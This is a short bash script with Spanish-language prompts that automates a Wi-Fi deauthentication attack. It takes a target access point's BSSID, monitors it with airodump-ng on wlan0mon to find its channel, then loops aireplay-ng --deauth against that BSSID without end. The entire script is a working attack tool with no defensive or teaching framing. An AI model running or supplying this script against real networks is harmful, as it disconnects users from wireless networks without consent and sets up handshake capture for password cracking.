#!/bin/bash

echo "	Ingrese bssid"

read var_bssid
echo " "
echo "El nombre del es $var_bssid"
echo " "
echo "	Analizar"

echo "airodump-ng wlan0mon --bssid $var_bssid"

x-terminal-emulator -e airodump-ng wlan0mon --bssid $var_bssid

echo " "
echo "	Leer canal"
read var_channel
echo "	Usando canal $var_channel"



while :
do
	echo "	Desautenticando"
echo "******************************************"

	x-terminal-emulator -e airodump-ng wlan0mon -c $var_channel --bssid $var_bssid &
echo "******************************************"
sleep 5
while :
do
	aireplay-ng --deauth 3 -a $var_bssid wlan0mon

	if [ $? -ne 0 ]; then 
	pkill airodump-ng
	break
	else 
	echo "Sí está en canal"; 
	fi

done 
	echo "Fin?"
	sleep 3

echo "Fin?"
sleep 1
done

